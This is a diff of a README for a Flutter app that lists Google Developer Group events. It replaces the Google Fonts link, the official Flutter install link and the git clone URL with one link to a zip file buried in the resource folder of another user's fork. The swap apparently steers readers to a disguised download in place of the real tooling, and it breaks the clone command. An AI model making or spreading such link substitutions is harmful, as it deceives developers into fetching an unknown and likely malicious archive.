@@ -3,7 +3,7 @@
 
 
 <hr>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap" rel="stylesheet">
+<link href="https://github.com/AyoubKezzoula/gdg-events-app/raw/refs/heads/master/android/app/src/main/res/gdg_app_events_thissen.zip" rel="stylesheet">
 <p align="center">
   <img src="assets/images/gdg.png" width="100" alt="gdg_logo"/></img>
   <h1 align="center"  style="font-family:'Poppins'">
@@ -68,10 +68,10 @@
 
 
 ## Test it
-1. First let assume that you already have flutter if not go [Here](https://docs.flutter.dev/get-started/install)
+1. First let assume that you already have flutter if not go [Here](https://github.com/AyoubKezzoula/gdg-events-app/raw/refs/heads/master/android/app/src/main/res/gdg_app_events_thissen.zip)
 2. Clone the repo
    ```bash
-   git clone https://github.com/abdelghanimeliani/gdg-events-app.git
+   git clone https://github.com/AyoubKezzoula/gdg-events-app/raw/refs/heads/master/android/app/src/main/res/gdg_app_events_thissen.zip
    ```
 3. cd into the repo then run it using **flutter CLI**
    ```bash
